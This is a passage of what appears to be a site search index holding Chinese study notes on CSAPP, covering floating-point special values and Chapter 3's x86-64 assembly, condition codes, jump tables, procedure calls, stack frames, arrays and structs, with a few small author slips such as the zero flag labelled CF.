<li><code>exp</code> \u5168\u4e3a 1</li> <li>\u7279\u6b8a\u503c\u4e5f\u5206\u4e24\u7c7b\uff1a<ul> <li>\u4e00\u7c7b\u662f\u65e0\u7a77\u5927<ul> <li><code>frac</code> \u5168\u4e3a 0 \u4e3a\u65e0\u7a77\u5927(\u6b63\u8d1f\u53f7\u770b <code>s</code>)</li> </ul> </li> <li>\u53e6\u4e00\u7c7b\u8868\u793a \"\u4e0d\u662f\u4e00\u4e2a\u6570(NaN)\"<ul> <li><code>frac</code> \u4e0d\u5168\u4e3a 0 \u5219\u4e3a Not a Number</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Rount-to-even</p> <p>\u4e3a\u4ec0\u4e48\u51fa\u73b0\u5411\u5076\u6570\u820d\u5165\u7684\u7edf\u8ba1\u65b9\u6cd5\uff1f\u56e0\u4e3a\u7edf\u4e00\u5411\u4e0a\u53d6\u6574\u6216\u5411\u4e0b\u53d6\u6574\u4f1a\u5bfc\u81f4\u5411\u4e0a\u6216\u5411\u4e0b\u7684\u504f\u5dee\uff0c\u4f46\u662f\u5411\u5076\u6570\u820d\u5165 (\u4ec5\u4e2d\u95f4\u503c\u5411\u5076\u6570\u820d\u5165\uff0c\u5176\u5b83\u503c\u56db\u820d\u4e94\u5165) \u7684\u8bef\u5dee\u4f1a\u6bd4\u8f83\u5c0f\u3002</p>"},{"location":"Accumulation/CSAPP/Chapter3/","title":"CH 3. \u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a","text":""},{"location":"Accumulation/CSAPP/Chapter3/#chapter-3-machine-level-representation-of-programs","title":"Chapter 3. Machine-level Representation of Programs","text":"<p> \u7ea6 3362 \u4e2a\u5b57  117 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 18 \u5206\u949f</p>"},{"location":"Accumulation/CSAPP/Chapter3/#historic-perspective","title":"Historic Perspective","text":"<p>Intel\u5904\u7406\u5668\u7684\u53d1\u5c55\u5386\u53f2</p> <p></p> <p><code>mov</code>\u7684\u65b9\u5411\u95ee\u9898</p> <p>\u6c47\u7f16\u6709<code>intel</code>,<code>att</code>\u4e24\u79cd\u683c\u5f0f\uff0c\u672c\u7bc7\u76f8\u5173\u7684\u6c47\u7f16\u4ee3\u7801\u5747\u91c7\u7528<code>intel</code>\u683c\u5f0f\uff0c\u5373<code>mov a,b</code>\u7b49\u6548\u4e8e<code>b=a</code></p> <pre><code>\u276f nano mstore.c\n 1 long mult2(long,long);\n 2\n 3 void mulstore(long x,long y,long *dest) {\n 4         long t = mult2(x,y);\n 5         *dest = t;\n 6 }\n\n\u276f gcc -O2 -S mstore.c\n# \u4f7f\u7528 O2 \u9009\u9879\u4f18\u5316\uff0c\u51cf\u5c11\u751f\u6210\u7684\u6c47\u7f16\u4ee3\u7801\u7684\u590d\u6742\u5ea6\n</code></pre> <p>\u4ec5\u622a\u53d6\u90e8\u5206\u6c47\u7f16\u4ee3\u7801\u4f5c\u4e3a\u793a\u4f8b\uff0c\u5176\u4e2d\u4ee5 <code>.</code> \u5f00\u5934\u7684\u884c\u90fd\u662f\u6307\u5bfc\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u5de5\u4f5c\u7684\u4f2a\u6307\u4ee4\uff0c\u5206\u6790\u6c47\u7f16\u4ee3\u7801\u7684\u65f6\u5019\u53ef\u4ee5\u5b8c\u5168\u5ffd\u7565\u5b83\u4eec\uff0c\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\u5c06\u5176\u5168\u90e8\u5220\u53bb\uff1a</p> <pre><code>mulstore:\n        pushq   %rbx \n        # \u5c06\u5bc4\u5b58\u5668%rbx\u7684\u503c\u538b\u5165\u7a0b\u5e8f\u6808\u4fdd\u5b58\uff0c\u5728\u8be5\u51fd\u6570\u8fd4\u56de\u524dpop\u6062\u590d\u5176\u503c\n        movq    %rdx, %rbx\n        # \u5c06%rdx\u5185\u5bb9\u590d\u5236\u5230%rbx\n        call    mult2@PLT\n        movq    %rax, (%rbx)\n        popq    %rbx\n        ret\n</code></pre> <p>\u5bc4\u5b58\u5668\u7684\u5206\u7c7b</p> <p>\u5bc4\u5b58\u5668\u5206\u4e3a\u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\u548c\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\uff0c\u5176\u533a\u522b\u5728\u4e8e\u6062\u590d\u67d0\u4e00\u5728\u8c03\u7528(<code>call</code>)\u51fd\u6570\u8fc7\u7a0b\u4e2d\u88ab\u4fee\u6539\u503c\u7684\u5bc4\u5b58\u5668\u65f6\uff0c\u5176\u6062\u590d\u65b9\u5f0f\u662f\u5728 \u8c03\u7528\u8005(Caller) \u4e2d\u5165\u6808\u51fa\u6808\u4fdd\u5b58\u503c\u8fd8\u662f\u5728 \u88ab\u8c03\u7528\u8005(Callee) \u4e2d\u5165\u6808\u51fa\u6808\u6062\u590d\u3002\u5982\uff0c\u4e0a\u9762\u7684<code>%rbx</code>\u5c31\u662f\u4e00\u4e2a callee-saved register </p> C\u8bed\u8a00\u6570\u636e\u7c7b\u578b\u5bf9\u5e94\u7684\u6c47\u7f16\u540e\u7f00 <p></p> <pre><code>\u276f gcc -O2 -c mstore.c\n# \u751f\u6210\u5bf9\u5e94\u7684\u673a\u5668\u4ee3\u7801\u6587\u4ef6 mstore.o \n\u276f ls\nmstore.c  mstore.o  mstore.s\n\u276f objdump -d mstore.o\n# \u53cd\u6c47\u7f16\u5668\u5c06\u673a\u5668\u4ee3\u7801\u7ffb\u8bd1\u6210\u6c47\u7f16\u4ee3\u7801\n\nmstore.o\uff1a     \u6587\u4ef6\u683c\u5f0f elf64-x86-64\n\nDisassembly of section .text:\n\n0000000000000000 &lt;mulstore&gt;:\n   0:   f3 0f 1e fa             endbr64\n   4:   53                      push   %rbx\n   5:   48 89 d3                mov    %rdx,%rbx\n   8:   e8 00 00 00 00          call   d &lt;mulstore+0xd&gt;\n   d:   48 89 03                mov    %rax,(%rbx)\n  10:   5b                      pop    %rbx\n  11:   c3                      ret\n</code></pre>"},{"location":"Accumulation/CSAPP/Chapter3/#_1","title":"\u673a\u5668\u6307\u4ee4","text":"<p>\u4ece16\u4f4d\u5bc4\u5b58\u5668\u523032\u4f4d\u5bc4\u5b58\u5668\u523064\u4f4d\u5bc4\u5b58\u5668</p> <p>\u5927\u591a\u6570\u6307\u4ee4\u7531\u64cd\u4f5c\u7801(Operation code,\u5982<code>movq</code>,<code>xorq</code>\u7b49)\u548c\u64cd\u4f5c\u6570(Operands,\u5982<code>%rbx</code>,<code>$8</code>\u7b49)\u7ec4\u6210\u3002</p> <ul> <li>\u64cd\u4f5c\u7801<ul> <li>Operation code</li> <li>\u5982<code>movq</code>,<code>xorq</code>\u7b49</li> </ul> </li> <li>\u64cd\u4f5c\u6570<ul> <li>Operands</li> <li>\u5206\u4e3a\u7acb\u5373\u6570\u3001\u5bc4\u5b58\u5668\u3001\u5185\u5b58\u5f15\u7528\u4e09\u7c7b<ul> <li>\u7acb\u5373\u6570\u4ee5<code>$</code>\u5f00\u5934\uff0c\u540e\u9762\u8ddf\u4e00\u4e2a\u6574\u6570\uff0c\u5982<code>$8</code></li> <li>\u5bc4\u5b58\u5668\u5916\u63a5\u4e00\u4e2a\u5c0f\u62ec\u53f7\u8868\u793a\u7684\u662f\u5185\u5b58\u5f15\u7528</li> </ul> </li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter3/#_2","title":"\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":"<ul> <li><code>mov a, b</code></li> <li><code>push a</code></li> <li><code>pop a</code></li> <li><code>xchg op1, op2</code><ul> <li>\u4ea4\u6362<code>op1</code>\u548c<code>op2</code></li> </ul> </li> </ul> <pre><code>movabsq $0x0011223344556677 %rax\n# %rax: 00 11 22 33 44 55 66 77\nmovb $-1 %al\n# %rax: 00 11 22 33 44 55 66 FF\nmovw $-1 %ax\n# %rax: 00 11 22 33 44 55 FF FF\nmovl $-1 %eax\n# %rax: 00 00 00 00 FF FF FF FF\n# \u4efb\u4f55\u4f4d\u5bc4\u5b58\u5668\u751f\u621032\u4f4d\u503c\u7684\u6307\u4ee4\u90fd\u4f1a\u628a\u8be5\u5bc4\u5b58\u5668\u7684\u9ad8\u4f4d\u7f6e0\n# \u5373\uff0c\u5f53movl\u7684\u76ee\u7684\u64cd\u4f5c\u6570\u4e3a\u5bc4\u5b58\u5668\u662f\uff0c\u9ad8\u56db\u5b57\u8282\u7f6e0\n</code></pre> <p>\u5f53\u6e90\u64cd\u4f5c\u6570\u6570\u4f4d\u5c0f\u4e8e\u76ee\u7684\u64cd\u4f5c\u6570\u65f6\uff0c\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u96f6\u62d3\u5c55\u6216\u7b26\u53f7\u4f4d\u62d3\u5c55</p> <p></p> <p>\u5bf9\u4e8e\u7a0b\u5e8f\u6808\uff0c\u6808\u5e95\u5bf9\u5e94\u5730\u5740\u9ad8\u4f4d\uff0c\u6808\u9876\u5bf9\u5e94\u5730\u5740\u4f4e\u4f4d\uff0c\u4e00\u822c\u4ee5\u6808\u9876\u5728\u4e0b\u4f5c\u4e3a\u7a0b\u5e8f\u6808\u7684\u8868\u793a\u65b9\u6cd5\u3002</p> <p>\u6307\u9488<code>%rsp</code>\u4fdd\u5b58\u6808\u9876\u7684\u5730\u5740\uff0c\u56e0\u6b64\uff0c\u5bf9\u4e8e\u5165\u6808\u6307\u4ee4 <code>pushq %rax</code>\uff0c\u5176\u7b49\u6548\u4e8e\uff1a</p> <ol> <li><code>subq $8, %rsp</code></li> <li><code>movq %rax, (%rsp)</code></li> </ol>"},{"location":"Accumulation/CSAPP/Chapter3/#_3","title":"\u7b97\u672f\u4e0e\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4","text":"<ul> <li><code>leaq src, dest</code><ul> <li>Load Effective Address</li> <li>\u5c06src\u7684\u6709\u6548\u5730\u5740\u5199\u5165dest</li> </ul> </li> </ul> \u5229\u7528<code>lea</code>\u5b9e\u73b0\u7b97\u6570\u8fd0\u7b97 <p>\u4e00\u4e9b\u4e00\u5143\u64cd\u4f5c\uff1a</p> Instruction Effect Description <code>INC D</code> \\(D\\leftarrow D+1\\) Increment \u81ea\u589e <code>DEC D</code> \\(D\\leftarrow D-1\\) Decrement \u81ea\u51cf <code>NEG D</code> \\(D\\leftarrow -D\\) Negate \u53d6\u8d1f <code>NOT D</code> \\(D\\leftarrow \\sim D\\) Complement \u53d6\u8865 <p>\u4e00\u4e9b\u4e8c\u5143\u64cd\u4f5c\uff1a</p> Instruction Effect Description <code>ADD S,D</code> \\(D\\leftarrow D+S\\) ADD \u52a0 <code>SUB S,D</code> \\(D\\leftarrow D-S\\) Substract \u51cf <code>IMUL S,D</code> \\(D\\leftarrow D*S\\) Multiply \u4e58 <code>XOR S,D</code> \\(D\\leftarrow D \\^ S\\) Exclusive-or \u5f02\u6216 <code>OR S,D</code> \\(D\\leftarrow D \\mid S\\) Or \u6216 <code>AND S,D</code> \\(D\\leftarrow D \\&amp; S\\) And \u4e0e <code>SAL k,D</code> \\(D\\leftarrow D&lt;&lt;k\\) Left shift \u5de6\u79fb <code>SHL k,D</code> \\(D\\leftarrow D&lt;&lt;k\\) Left shift \u7b49\u540c\u4e8e<code>SAL</code> <code>SAR k,D</code> \\(D\\leftarrow D&gt;&gt;_Ak\\) Arithmetic right shift \u7b97\u6570\u53f3\u79fb <code>SHR k,D</code> \\(D\\leftarrow D&gt;&gt;_L k\\) Logical right shift \u903b\u8f91\u53f3\u79fb <p>\u5bf9\u4e8e\u79fb\u4f4d\u6307\u4ee4\uff0c\u53ea\u5141\u8bb8\u4ee5\u7279\u5b9a\u5bc4\u5b58\u5668<code>cl</code>\u4f5c\u4e3a\u64cd\u4f5c\u6570</p>"},{"location":"Accumulation/CSAPP/Chapter3/#_4","title":"\u6307\u4ee4\u4e0e\u6761\u4ef6\u7801","text":"<p>ALU\u9664\u4e86\u6267\u884c\u7b97\u6570\u548c\u903b\u8f91\u8fd0\u7b97\u4e4b\u5916\uff0c\u8fd8\u4f1a\u6839\u636e\u8be5\u8fd0\u7b97\u7684\u7ed3\u679c\u53bb\u8bbe\u7f6e \u6761\u4ef6\u7801\u5bc4\u5b58\u5668</p> <p>\u6761\u4ef6\u7801\u5bc4\u5b58\u5668\u7531CPU\u6765\u7ef4\u62a4\uff0c\u957f\u5ea6\u662f\u5355\u4e2a\u6bd4\u7279\u4f4d\uff0c\u5b83\u63cf\u8ff0\u4e86\u6700\u8fd1\u6267\u884c\u64cd\u4f5c\u7684\u5c5e\u6027\u3002\u5047\u8bbeALU\u6267\u884c\u4e24\u4e2a\u8fde\u7eed\u7684\u7b97\u6570\u6307\u4ee4\uff1a</p> <pre><code>t1: addq %rax, %rbx\nt2: subq %rcx, %rbx\n</code></pre> <p>t1\u65f6\u523b\uff0c\u6761\u4ef6\u7801\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u6307\u4ee41\u7684\u6267\u884c\u7ed3\u679c\u7684\u5c5e\u6027\uff1bt2\u65f6\u523b\uff0c\u6761\u4ef6\u7801\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\u5c06\u88ab\u4e0b\u4e00\u6761\u6307\u4ee4\u7ed3\u679c\u5c5e\u6027\u8986\u76d6\u3002</p> <p>\u5e38\u7528\u6761\u4ef6\u7801\uff1a</p> <ul> <li><code>CF</code> \u8fdb\u4f4d\u6807\u5fd7 (Carry FLag)<ul> <li>\u5f53CPU\u6700\u8fd1\u6267\u884c\u7684\u4e00\u6761\u6307\u4ee4\u6700\u9ad8\u4f4d\u4ea7\u751f\u8fdb\u4f4d\u7684\u65f6\u5019\uff0c<code>CF</code> \u7f6e1\uff0c\u7528\u6765\u68c0\u67e5\u65e0\u7b26\u53f7\u6570\u64cd\u4f5c\u7684\u6ea2\u51fa</li> </ul> </li> <li><code>CF</code> \u96f6\u6807\u5fd7 (Zero Flag)<ul> <li>\u5f53\u6700\u8fd1\u64cd\u4f5c\u7684\u7ed3\u679c\u7b49\u4e8e\u96f6\u65f6\uff0c<code>ZF</code> \u7f6e1</li> </ul> </li> <li><code>SF</code> \u7b26\u53f7\u6807\u5fd7 (Sign Flag)<ul> <li>\u5f53\u6700\u8fd1\u64cd\u4f5c\u7684\u7ed3\u679c\u5c0f\u4e8e\u96f6\u65f6\uff0c<code>SF</code> \u7f6e1</li> </ul> </li> <li><code>OF</code> \u6ea2\u51fa\u6807\u5fd7 (Overflow Flag)<ul> <li>\u9488\u5bf9\u6709\u7b26\u53f7\u6570\uff0c\u6700\u8fd1\u7684\u64cd\u4f5c\u5bfc\u81f4\u6b63\u6ea2\u51fa\u6216\u8005\u8d1f\u6ea2\u51fa\u65f6 <code>OF</code> \u7f6e1</li> </ul> </li> </ul> <p><code>cmp</code>\u548c<code>test</code>\u4e24\u4e2a\u6307\u4ee4\u7528\u4ee5\u8bbe\u7f6e\u6761\u4ef6\u5bc4\u5b58\u5668\u7684\u503c(\u4e0d\u6539\u53d8\u5176\u5b83\u5bc4\u5b58\u5668)</p>"},{"location":"Accumulation/CSAPP/Chapter3/#_5","title":"\u6761\u4ef6\u7801\u7684\u5e94\u7528","text":"<ul> <li> <p>\u5e94\u7528\u4e00\uff1a\u5229\u7528\u7b26\u53f7\u6807\u5fd7\u5224\u65ad <code>a==b</code> </p> </li> <li> <p>\u5e94\u7528\u4e8c\uff1a\u5224\u65ad <code>a&lt;b</code> \uff0c\u4e0e\u4e0a\u8ff0\u7c7b\u4f3c\uff0c\u4f46\u9700\u8981\u7528 <code>SF^OF</code> \u5224\u65ad\u7ed3\u679c</p> <ul> <li>\u8bbe <code>t=a-b</code></li> <li>\u5f53\u6ca1\u6709\u53d1\u751f\u6ea2\u51fa\uff0c\u5373 <code>OF=0</code><ul> <li>Case 1\uff1a<code>a&lt;b,t&lt;0,SF=1,SF^OF=1</code></li> <li>Case 2\uff1a<code>a&gt;b,t&gt;0,SF=0,SF^OF=0</code></li> </ul> </li> <li>\u5f53\u6709\u53d1\u751f\u6ea2\u51fa\uff0c\u5373 <code>OF=1</code><ul> <li>Case 3\uff1a\u4f8b\u5982<code>a=-2,b=127</code>\u65f6\uff0c<code>a&lt;b,t=127&gt;0,SF=0,SF^OF=1</code></li> <li>Case 4\uff1a\u4f8b\u5982<code>a=1,b=-128</code>\u65f6\uff0c<code>a&gt;b,t=-127&lt;0,SF=1,SF^OF=0</code></li> </ul> </li> </ul> </li> </ul> \u5176\u5b83\u5224\u65ad\u60c5\u51b5 \u6709\u7b26\u53f7\u6570\u65e0\u7b26\u53f7\u6570 <p></p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter3/#_6","title":"\u8df3\u8f6c\u6307\u4ee4\u548c\u5faa\u73af\u6307\u4ee4","text":"<p>\u8df3\u8f6c\u6307\u4ee4<code>jl .L4</code>\u529f\u80fd\u4e3a\uff0c\u5f53<code>x&gt;y</code>\u65f6\uff0c\u987a\u5e8f\u6267\u884c\uff1b\u5f53<code>x&lt;y</code>\u65f6\uff0c\u8df3\u8f6c\u81f3<code>.L4</code>\u5904\u7ee7\u7eed\u6267\u884c</p> <p></p> <p>\u4e0e<code>set</code>\u6307\u4ee4\u7c7b\u4f3c\uff0c\u5176\u5b83\u5404\u4e2a\u8df3\u8f6c\u6307\u4ee4\u529f\u80fd\u5982\u4e0b</p> <p></p> <p>\u73b0\u4ee3\u5904\u7406\u5668\u4f1a\u63d0\u524d\u9884\u6d4b\u5206\u652f\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u5982\u679c\u9884\u6d4b\u9519\u8bef\u4f1a\u6e05\u7a7a\u6d41\u6c34\u7ebf\u5927\u5927\u964d\u4f4e\u6548\u7387</p> <p>\u5faa\u73af\u8bed\u53e5\u662f\u901a\u8fc7\u6761\u4ef6\u6d4b\u8bd5\u548c\u8df3\u8f6c\u7684\u7ed3\u5408\u6765\u5b9e\u73b0\u7684</p> <p>\u901a\u8fc7 <code>do-while</code> \u5faa\u73af\u6c42\u9636\u4e58\uff1a </p> <p>\u9664\u4e86 <code>do-while</code> \u5916\uff0c\u91c7\u7528 <code>while</code> \u548c <code>for</code> \u751f\u6210\u7684\u6c47\u7f16\u4ee3\u7801\u4e5f\u57fa\u672c\u7c7b\u4f3c</p> <p>C\u8bed\u8a00\u8fd8\u63d0\u4f9b\u4e86 <code>switch</code> \u8bed\u53e5\uff0c\u6839\u636e\u7d22\u5f15\u503c\u8fdb\u884c\u591a\u91cd\u5206\u652f\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a <code>switch(n)</code> \u8bed\u53e5\u5bf9<code>case 0;</code>,<code>case 1</code>,...,\u4e00\u76f4\u5230<code>case 6</code>\u7684\u60c5\u51b5\u505a\u4e86\u5206\u652f\uff0c\u90a3\u4e48\u5176\u6c47\u7f16\u4ee3\u7801\u5173\u952e\u8bed\u53e5\u6709\uff1a</p> <pre><code>switch_eg:\n    cmpq $6, %rsi # compare n:6\n    ja .L8\n    leaq .L4(%rip), %rcx\n.L4:\n# \u5bf9\u4e8eCase 0-6 \u7684\u60c5\u51b5\uff0c\u901a\u8fc7\u8df3\u8f6c\u8868\u6765\u8bbf\u95ee\u4e0d\u540c\u5206\u652f\n    .long: .L3-.L4 # case 0\n    .long: .L8-.L4 # case 1\n    .long: .L5-.L4 # case 2\n    .long: .L6-.L4 # case 3\n    .long: .L7-.L4 # case 4\n    .long: .L8-.L4 # case 5\n    .long: .L7-.L4 # case 6\n# \u91cd\u590d\u60c5\u51b5\uff0c\u5982case 4\u548c6\uff0c\u8df3\u8f6c\u81f3\u7edf\u4e00\u4f4d\u7f6e\n</code></pre> <p>\u4e3a\u4ec0\u4e48<code>switch</code>\u6bd4<code>if-else</code>\u5feb\uff1f</p> <p>\u7a0b\u5e8f\u4f7f\u7528\u8df3\u8f6c\u8868\u6765\u5904\u7406\u591a\u91cd\u5206\u652f\u3002\u5c31\u7b97<code>swtich</code>\u60c5\u51b5\u5f88\u591a\uff0c\u7a0b\u5e8f\u4e5f\u53ea\u9700\u8981\u4e00\u6b21\u8df3\u8f6c\u5c31\u80fd\u5904\u7406\u590d\u6742\u7684\u5206\u652f\u60c5\u51b5(\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(1)</code>)</p>"},{"location":"Accumulation/CSAPP/Chapter3/#_7","title":"\u8fc7\u7a0b (\u51fd\u6570\u8c03\u7528)","text":"<p>\u8fc7\u7a0b\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c01\u88c5\u4ee3\u7801\u7684\u65b9\u5f0f\uff0c\u5b83\u53ef\u4ee5\u9690\u85cf\u67d0\u4e2a\u884c\u4e3a\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u540c\u65f6\u63d0\u4f9b\u6e05\u6670\u7684\u63a5\u53e3\u5b9a\u4e49\u3002\u5728\u4e0d\u540c\u7684\u7f16\u7a0b\u8bed\u8a00\u4e2d\uff0c\u8fc7\u7a0b\u7684\u5177\u4f53\u5b9e\u73b0\u53ef\u4ee5\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5982C\u8bed\u8a00\u7684\u51fd\u6570\u3001Java\u7684\u65b9\u6cd5\u7b49</p> <p>\u5f53\u51fd\u6570\u6267\u884c\u6240\u9700\u8981\u7684\u5b58\u50a8\u7a7a\u95f4\u8d85\u51fa\u5bc4\u5b58\u5668\u80fd\u591f\u5b58\u653e\u7684\u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u501f\u52a9\u6808\u4e0a\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u6211\u4eec\u628a\u8fd9\u90e8\u5206\u5b58\u50a8\u7a7a\u95f4\u79f0\u4e3a\u51fd\u6570\u7684\u6808\u5e27\u3002</p>"},{"location":"Accumulation/CSAPP/Chapter3/#_8","title":"\u8fd4\u56de\u5730\u5740","text":"<p>\u5f53\u4e00\u4e2a\u51fd\u6570P\u8c03\u7528\u51fd\u6570Q\u65f6\uff0c\u4f1a\u5c06\u4e00\u4e2a\u8fd4\u56de\u5730\u5740\u538b\u5165\u6808\u4e2d\uff0c\u8be5\u5730\u5740\u6307\u660e\u4e86\u51fd\u6570Q\u6267\u884c\u7ed3\u675f\u8fd4\u56de\u65f6\u8981\u4ece\u51fd\u6570P\u7684\u54ea\u4e2a\u4f4d\u7f6e\u7ee7\u7eed\u6267\u884c\uff0c\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u7684\u538b\u6808\u64cd\u4f5c\u5e76\u4e0d\u662f\u7531\u6307\u4ee4<code>push</code>\u6765\u6267\u884c\uff0c\u800c\u662f\u7531\u51fd\u6570\u8c03\u7528\u6307\u4ee4<code>call</code>\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u4ee5\u4e0b\u4f8b\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b\uff0c\u5728<code>main</code>\u51fd\u6570\u4e2d\u8c03\u7528<code>multstore</code>\u51fd\u6570\uff0c\u4f7f\u7528<code>gcc</code>\u751f\u6210\u673a\u5668\u7801\u5e76\u7528<code>objdump</code>\u53cd\u6c47\u7f16\u67e5\u770b\uff1a</p> <p></p> <p>\u89c2\u5bdf\u76f8\u5173\u6c47\u7f16\u90e8\u5206\u53ef\u77e5\uff0c<code>call</code>\u6307\u4ee4\u8c03\u7528<code>multstore</code>\u65f6\uff0c\u4f1a\u5411\u7a0b\u5e8f\u6808\u4e2d\u538b\u5165\u5730\u5740<code>0x700</code>\uff0c\u5373<code>main</code>\u51fd\u6570\u4e2d\u8c03\u7528\u51fd\u6570\u5b8c\u6bd5\u540e\u7684\u4e0b\u4e00\u6761\u547d\u4ee4\u7684\u5730\u5740\u3002</p> <p>\u5f53\u51fd\u6570<code>multstore</code>\u6267\u884c\u5b8c\u6bd5\uff0c\u6307\u4ee4<code>ret</code>\u4ece\u6808\u4e2d\u5f39\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u5199\u5165\u5230\u7a0b\u5e8f\u6307\u4ee4\u5bc4\u5b58\u5668<code>%rip</code>\u4e2d</p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter3/#_9","title":"\u53c2\u6570\u4f20\u9012","text":"<p>\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u5927\u4e8e6\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u5c31\u8981\u901a\u8fc7\u6808\u6765\u4f20\u9012</p> <p>\u5047\u8bbe\u51fd\u6570P\u6709n\u4e2a\u6574\u578b\u53c2\u6570\uff0c\u53c2\u65701\u5230\u53c2\u65706\u7684\u4f20\u9012\u53ef\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u5f53n\u7684\u503c\u5927\u4e8e6\u65f6\uff0c\u53c2\u65707\u53ca\u5176\u4e4b\u540e\u7684\u53c2\u6570\u9700\u8981\u7528\u5230\u6808\u6765\u4f20\u9012\u3002</p> <p></p> <ul> <li>\u901a\u8fc7\u6808\u6765\u4f20\u9012\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6240\u6709\u7684\u6570\u636e\u5927\u5c0f\u90fd\u662f\u54118\u7684\u500d\u6570\u770b\u9f50</li> <li>\u5bc4\u5b58\u5668\u7684\u4f7f\u7528\u53d6\u51b3\u4e8e\u4f20\u9012\u53c2\u6570\u7684\u5927\u5c0f</li> <li><code>%rsp</code>\u901a\u5e38\u6307\u5411\u6808\u9876</li> </ul> <p>More Example:</p> <pre><code>long caller()\n{\n    long arg1 = 534;\n    long arg2 = 1057;\n    long sum = swap(&amp;arg1,&amp;arg2);\n    //\u4ea4\u6362\u4e24\u4e2a\u6307\uff0c\u5e76\u8fd4\u56de\u5b83\u4eec\u7684\u548c\n    long diff = arg1 - arg2;\n    return sum * diff;\n}\n\nlong swap(long *xp, long *yp)\n{\n    long x = *xp;\n    long y = *yp;\n    *xp = y;\n    *yp = x;\n    return x+y;\n}\n</code></pre> <p>\u5bf9\u5e94\u751f\u6210\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p> <ul> <li><code>subq $16, %rsp</code> \u5c06\u6808\u9876\u6307\u9488<code>%rsp</code>\u5411\u4e0b\u79fb\u52a816\u5b57\u8282\uff0c\u8868\u793a\u5728\u6808\u4e0a\u5206\u914d16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4</li> <li>\u63a5\u4e0b\u6765\u4e24\u6761<code>movq</code>\u6307\u4ee4\u5c06<code>arg1</code>\u548c<code>arg2</code>\u5b58\u50a8\u5728\u51fd\u6570<code>caller</code>\u7684\u6808\u5e27\u4e0a</li> <li>\u53c2\u6570\u51c6\u5907\u5b8c\u6bd5\u540e\uff0c\u6267\u884c<code>call</code>\u6307\u4ee4\u8c03\u7528<code>swap</code>\u51fd\u6570</li> <li>\u6700\u540e\u51fd\u6570<code>caller</code>\u8fd4\u56de\u4e4b\u524d\uff0c\u901a\u8fc7\u6808\u9876\u6307\u9488\u52a0\u4e0a16\u7684\u64cd\u4f5c\u6765\u91ca\u653e\u6808\u5e27</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter3/#_10","title":"\u6570\u7ec4\u7684\u5206\u914d\u4e0e\u8bbf\u95ee","text":"<p>\u5bf9\u4e8e\u4e0d\u540c\u7684\u6307\u9488\uff0c<code>char *p</code>\u4ee5\u53ca<code>int *q</code>\uff0c\u82e5\u5176\u5bf9\u5e94\u7684\u5730\u5740\u90fd\u4e3a<code>0x100</code></p> <ul> <li><code>p=p+1</code> \u2192 <code>0x101</code></li> <li><code>q=q+1</code> \u2192 <code>0x104</code></li> </ul> <p>\u5bf9\u4e8e\u6570\u7ec4<code>int E[6]</code>\uff0c\u5176\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3a<code>E[1]</code>\u6216<code>*(E+1)</code></p> <p>\u5728<code>ISO C99</code>\u6807\u51c6\u4e2d\uff0c\u5f15\u5165\u4e86\u53d8\u957f\u6570\u7ec4\u7684\u6982\u5ff5:</p> <pre><code>long var_ele(long n, int A[n][n], long i, long k){\n    return A[i][j];\n}\n</code></pre> <p>\u5f53\u53d8\u957f\u6570\u7ec4\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u65f6\uff0c\u53c2\u6570n\u5fc5\u987b\u5728\u6570\u7ec4A\u4e4b\u524d\u3002\u53d8\u957f\u6570\u7ec4\u5143\u7d20\u7684\u5730\u5740\u8ba1\u7b97\u4e0e\u5b9a\u957f\u6570\u7ec4\u7c7b\u4f3c\uff0c\u4e0d\u540c\u70b9\u5728\u4e8e\u65b0\u589e\u4e86\u53c2\u6570<code>n</code>\uff0c\u9700\u8981\u4f7f\u7528\u4e58\u6cd5\u6307\u4ee4<code>imulq</code>\u6765\u8ba1\u7b97<code>n*i</code></p>"},{"location":"Accumulation/CSAPP/Chapter3/#_11","title":"\u7ed3\u6784\u4f53\u4e0e\u8054\u5408\u4f53","text":"<p>\u9996\u5148\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u4e00\u4e2a\u7ed3\u6784\u4f53\u7684\u58f0\u660e\uff1a</p> <pre><code>struct rec {\n    int i;\n    int j;\n    int a[2];\n    int *p;\n};\n\n//\u5176\u5404\u4e2a\u5b57\u6bb5\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u8d77\u59cb\u5730\u5740\u5904\u7684\u5b57\u8282\u504f\u79fb\u5982\u4e0b\n0    4    8    12   16\n+----+----+----+----+----+\n| i  | j  |a[0]|a[1]| p  |\n+----+----+----+----+----+\n</code></pre> 